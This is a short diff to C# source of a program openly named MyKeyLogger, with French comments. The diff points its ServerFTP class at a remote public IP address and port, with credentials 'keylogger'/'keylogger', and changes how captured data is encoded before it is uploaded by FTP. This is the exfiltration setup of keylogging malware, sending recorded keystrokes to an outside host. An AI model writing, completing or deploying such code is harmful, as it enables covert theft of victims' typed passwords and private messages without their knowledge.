@@ -7,11 +7,15 @@ namespace MyKeyLogger
 {
 	public class ServerFTP
 	{
-		public const string SERVER = "127.0.0.1";
+		public const string IP = "86.207.198.22";
 
-		public const string USERNAME = "test";
+		public const string PORT = "9080";
+		
+		public const string SERVER = IP + ":" + PORT + "/files";
 
-		public const string PASSWORD = "";
+		public const string USERNAME = "keylogger";
+
+		public const string PASSWORD = "keylogger";
 		// Constructeur par defaut, il y a rien dedans
 		public ServerFTP(){}
 		
@@ -103,7 +107,7 @@ namespace MyKeyLogger
 				try {
 				
 					// Encode la chaîne de caractères en une séquence d'octets.
-					buffer = Encoding.ASCII.GetBytes(data);
+					buffer = Encoding.UTF8.GetBytes(data);
 					
 					// Obtenir le flux qui va contenir les données
 					stream = ftpRequest.GetRequestStream();
